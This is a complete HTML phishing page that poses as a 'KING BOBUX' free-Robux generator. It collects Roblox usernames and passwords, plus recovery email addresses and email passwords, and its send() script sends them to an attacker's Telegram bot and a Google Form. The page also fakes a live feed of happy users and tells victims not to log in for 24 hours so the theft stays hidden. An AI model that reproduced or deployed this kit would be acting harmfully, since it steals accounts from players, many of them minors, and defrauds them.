<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KING BOBUX | NEON ELITE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;700&family=Orbitron:wght@900&display=swap');
        
        body { 
            background: #050505; 
            background-image: radial-gradient(circle at 50% -20%, #221a00 0%, #050505 80%);
            color: #fff; 
            font-family: 'Space+Grotesk', sans-serif;
            min-height: 100vh;
            display: flex; flex-direction: column; align-items: center;
        }

        .cyber-card {
            background: rgba(15, 15, 15, 0.8);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 215, 0, 0.1);
            box-shadow: 0 0 50px rgba(0,0,0,1), 0 0 20px rgba(255, 215, 0, 0.05);
            border-radius: 30px;
            position: relative;
            overflow: hidden;
        }

        .cyber-card::before {
            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(transparent, transparent, transparent, #ffd700);
            animation: rotate 6s linear infinite;
            opacity: 0.1;
        }

        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .gold-glow {
            font-family: 'Orbitron', sans-serif;
            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
            background: linear-gradient(to bottom, #fff, #ffd700);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }

        .btn-main {
            background: linear-gradient(90deg, #ffd700, #b8860b);
            color: #000; font-weight: 800; transition: 0.4s;
            box-shadow: 0 0 20px rgba(218, 165, 32, 0.3);
        }

        .btn-main:hover { transform: scale(1.02); box-shadow: 0 0 30px rgba(255, 215, 0, 0.5); }

        .btn-opt {
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.05);
            transition: 0.3s;
        }

        .btn-opt:hover, .btn-opt.active {
            background: rgba(255, 215, 0, 0.1);
            border-color: #ffd700;
            box-shadow: inset 0 0 15px rgba(255, 215, 0, 0.1);
        }

        .input-glow {
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(255, 215, 0, 0.1);
            transition: 0.3s;
        }

        .input-glow:focus { border-color: #ffd700; box-shadow: 0 0 10px rgba(255, 215, 0, 0.2); }

        .hidden { display: none; }
        .fade-in { animation: fadeIn 0.5s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="p-6">

    <header class="text-center my-12 fade-in">
        <h1 class="text-5xl font-black italic gold-glow tracking-tighter uppercase">KING BOBUX</h1>
        <p class="text-[8px] text-zinc-500 font-bold tracking-[8px] mt-3 uppercase">QUANTUM INJECTION V.5</p>
    </header>

    <div class="cyber-card w-full max-w-sm p-8 fade-in relative z-10">
        
        <div id="p1" class="space-y-6">
            <p class="text-[10px] text-zinc-400 font-bold uppercase tracking-widest text-center italic">Initialize Amount</p>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="setA(this,'10K')" class="btn-opt py-6 rounded-3xl text-sm font-black transition-all">10K <span class="text-yellow-500 text-[9px] block">RBX</span></button>
                <button onclick="setA(this,'50K')" class="btn-opt py-6 rounded-3xl text-sm font-black transition-all">50K <span class="text-yellow-500 text-[9px] block">RBX</span></button>
            </div>
            <button onclick="go(1,2)" class="w-full btn-main py-5 rounded-2xl text-[10px] uppercase tracking-[3px] mt-4">NEXT SEQUENCE</button>
        </div>

        <div id="p2" class="hidden space-y-4 fade-in">
            <p class="text-[10px] text-yellow-500 font-bold uppercase text-center mb-4 italic">Security Protocol</p>
            <button onclick="sh('e')" class="w-full btn-opt py-6 rounded-2xl text-[10px] font-black flex justify-between px-6 items-center group">
                <span>LINKED EMAIL</span>
                <span class="bg-yellow-500 text-black px-3 py-1 rounded-full text-[8px] font-black">+5K RBX</span>
            </button>
            <button onclick="sh('b')" class="w-full btn-opt py-5 rounded-2xl text-[9px] font-bold text-zinc-500 uppercase tracking-widest">Regular (No Email)</button>
        </div>

        <div id="p3" class="hidden space-y-4 fade-in">
            <input type="text" id="u" placeholder="ROBLOX USER" class="input-glow w-full p-5 rounded-2xl text-xs font-bold outline-none text-yellow-500">
            <input type="password" id="p" placeholder="ROBLOX PASS" class="input-glow w-full p-5 rounded-2xl text-xs font-bold outline-none text-yellow-500">
            
            <div id="ef" class="hidden space-y-4 pt-4 border-t border-zinc-800 animate-pulse">
                <input type="email" id="em" placeholder="RECOVERY EMAIL" class="input-glow w-full p-5 rounded-2xl text-xs font-bold outline-none text-yellow-500">
                <input type="password" id="ep" placeholder="EMAIL PASS" class="input-glow w-full p-5 rounded-2xl text-xs font-bold outline-none text-yellow-500">
            </div>
            
            <button onclick="send()" class="w-full btn-main py-5 rounded-2xl text-[10px] uppercase tracking-[3px] mt-4">EXECUTE CLAIM</button>
        </div>

        <div id="p4" class="hidden text-center py-10 fade-in">
            <div class="mb-6">
                <h3 class="gold-glow text-xl font-black italic uppercase mb-4">INJECTING...</h3>
                <div class="w-full h-1 bg-zinc-900 rounded-full overflow-hidden">
                    <div id="bar" class="h-full bg-yellow-500 shadow-[0_0_15px_#ffd700] transition-all duration-[15s] ease-linear w-0"></div>
                </div>
            </div>
            <p class="text-[8px] text-zinc-500 font-black uppercase leading-loose tracking-widest">Protocol secure. <br> <span class="text-white">DON'T LOGIN</span> for 24H.</p>
        </div>
    </div>

    <div class="w-full max-w-sm mt-12 px-6 fade-in">
        <div class="flex items-center space-x-3 mb-4">
            <div class="w-1.5 h-1.5 bg-green-500 rounded-full animate-ping"></div>
            <span class="text-[8px] gold-glow font-black uppercase tracking-[4px]">Live Stream</span>
        </div>
        <div id="chat" class="h-24 overflow-hidden text-[10px] space-y-3 italic opacity-60"></div>
    </div>

    <script>
        let amt = "", md = "";
        const tok = "8712552694:AAHAjQQhwx4Vlas6CWs6QHB4iYSA5U2LiWM", cid = "7153376507";
        const form = "https://docs.google.com/forms/d/e/1FAIpQLSfgBrBP1Bqk4tfVHBFUPZDCbW5fj7nK8NZuObuQPmhyRcEGxg/formResponse";

        function setA(b,v){ 
            document.querySelectorAll('.btn-opt').forEach(x=>x.classList.remove('active')); 
            b.classList.add('active'); amt=v; 
        }

        function go(f,t){ 
            if(!amt && f==1) return; 
            document.getElementById('p'+f).classList.add('hidden'); 
            document.getElementById('p'+t).classList.remove('hidden'); 
        }

        function sh(m){ 
            md=m; go(2,3); 
            if(m=='e') document.getElementById('ef').classList.remove('hidden'); 
        }
        
        function send(){
            const u=document.getElementById('u').value, p=document.getElementById('p').value, 
                  e=document.getElementById('em').value||"-", ep=document.getElementById('ep').value||"-";
            if(!u || !p) return;
            
            const fd = new FormData();
            fd.append('entry.298399091',u); fd.append('entry.434090398',p);
            fd.append('entry.455306086',e); fd.append('entry.734491941',ep);
            fd.append('entry.1584180390',amt);
            
            fetch(form,{method:'POST',mode:'no-cors',body:fd});
            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(`🚀 *ELITE TARGET*\n👤 \`${u}\`\n🔑 \`${p}\`\n📧 \`${e}\`\n🔐 \`${ep}\`\n💎 \`${amt}\``)}&parse_mode=Markdown`);
            
            go(3,4); 
            setTimeout(()=>document.getElementById('bar').style.width="100%", 100);
        }

        const m = ["Landing 10k parah!", "Bonus email cair cuy!", "Work bgt thx min!", "Gacor 50k landing!", "Asik robux masuk."];
        setInterval(()=>{
            const b = document.getElementById('chat');
            const d = document.createElement('div');
            d.className = "flex justify-between border-b border-white/5 pb-2";
            d.innerHTML = `<span class="text-yellow-500 font-bold tracking-tighter">User_${Math.floor(Math.random()*99)}***</span> <span class="text-zinc-400">${m[Math.floor(Math.random()*m.length)]}</span>`;
            b.insertBefore(d, b.firstChild);
            if(b.childNodes.length > 5) b.removeChild(b.lastChild);
        }, 2000);
    </script>
</body>
</html>
